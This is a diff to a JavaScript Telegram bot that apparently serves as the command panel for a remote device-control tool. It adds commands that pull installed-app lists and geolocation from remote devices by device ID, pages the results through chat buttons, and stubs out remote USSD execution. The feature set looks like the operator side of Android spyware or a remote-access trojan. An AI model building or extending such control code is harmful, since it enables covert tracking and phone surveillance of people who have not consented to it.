@@ -70,14 +70,14 @@ function sortAppsToString(apps, inslice, devid, msgowner){
     if (inslice < (allapps.length - 1)){
         keybinds[0].push({
             text: build("next ⏭"),
-            callback_data: `seeApps_${msgowner}_${devid}_${inslice + 1}`
+            callback_data: `sa_${msgowner}_${devid}_${inslice + 1}`
         })
     }
 
     if (inslice > 0){
         keybinds[0].push({
             text: build("⏮ previous"),
-            callback_data: `seeApps_${msgowner}_${devid}_${inslice - 1}`
+            callback_data: `sa_${msgowner}_${devid}_${inslice - 1}`
         })
     }
 
@@ -660,13 +660,14 @@ bot.on("callback_query", async (call) => {
                 build(`🍂 ${sym} data sent to the client\n - waiting to get data ...`),
                 {
                     chat_id: call.message.chat.id,
-                    message_id: call.message.chat.id
+                    message_id: call.message.message_id
                 }
             )
             me.write(JSON.stringify({
                 port: portname,
                 password: passname,
                 method: "getGeoLocation",
+                device_id: spl[2],
                 mask: "metro",
                 shortcut: {
                     chat_id: call.message.chat.id,
@@ -674,6 +675,59 @@ bot.on("callback_query", async (call) => {
                     edit: true
                 }
             }))
+        } else if (mode == "getInstalledApps"){
+            await bot.editMessageText(
+                build(`🦋 ${sym} data sent to the client\n - waiting to get data ...`),
+                {
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id
+                }
+            )
+            me.write(JSON.stringify({
+                port: portname,
+                password: passname,
+                device_id: spl[2],
+                mask: "metro",
+                method: "getInstalledApps",
+                shortcut: {
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id,
+                    msgowner: uid,
+                    edit: true
+                }
+            }))
+        } else if (mode == "sa"){
+            let devid = spl[2];
+            let slc = spl[3];
+            if (Object.keys(device_apps).includes(devid)){
+                let srta = sortAppsToString(device_apps[devid], slc, devid, uid);
+                await bot.editMessageText(
+                    srta.message,
+                    {
+                        chat_id: call.message.chat.id,
+                        message_id: call.message.message_id,
+                        reply_markup: {
+                            inline_keyboard: srta.binds
+                        }
+                    }
+                )
+            } else {
+                await bot.editMessageText(
+                    build(`🔴 ${sym} sorry but no apps selected for your device-id, please order to see apps from user-panel then use keyboard`),
+                    {
+                        chat_id: call.message.chat.id,
+                        message_id: call.message.message_id
+                    }
+                )
+            }
+        } else if (mode == "runUSSD"){
+            await bot.editMessageText(
+                build("- soon ..."),
+                {
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id
+                }
+            )
         }
     }
 })
@@ -745,11 +799,24 @@ me.on("data", async (data) => {
                         }
                     )
                 }
+            } else if (_message.method == "getInstalledApps"){
+                if (_message.shortcut){
+                    device_apps[_message.device_id] = _message.apps;
+                    let srta = sortAppsToString(_message.apps, 0, _message.device_id, _message.shortcut.msgowner)
+                    await bot.editMessageText(
+                        srta.message,
+                        {
+                            chat_id: _message.shortcut.chat_id,
+                            message_id: _message.shortcut.message_id,
+                            reply_markup: {
+                                inline_keyboard: srta.binds
+                            }
+                        }
+                    )
+                }
             }
         } else {
-            //if (_message.method == "getUserByDeviceId"){
             if (_message.shortcut){
-                //if (_message.shortcut.way == "seeMenu"){
                 if (_message.message == "USER_NOT_FOUND"){
                     _message.edit == false ? await bot.sendMessage(
                         _message.shortcut.chat_id,
@@ -808,9 +875,7 @@ me.on("data", async (data) => {
                         }
                     )
                 }
-                //}
             }
-            //}
         }
     } catch (e) {
         console.log(e)
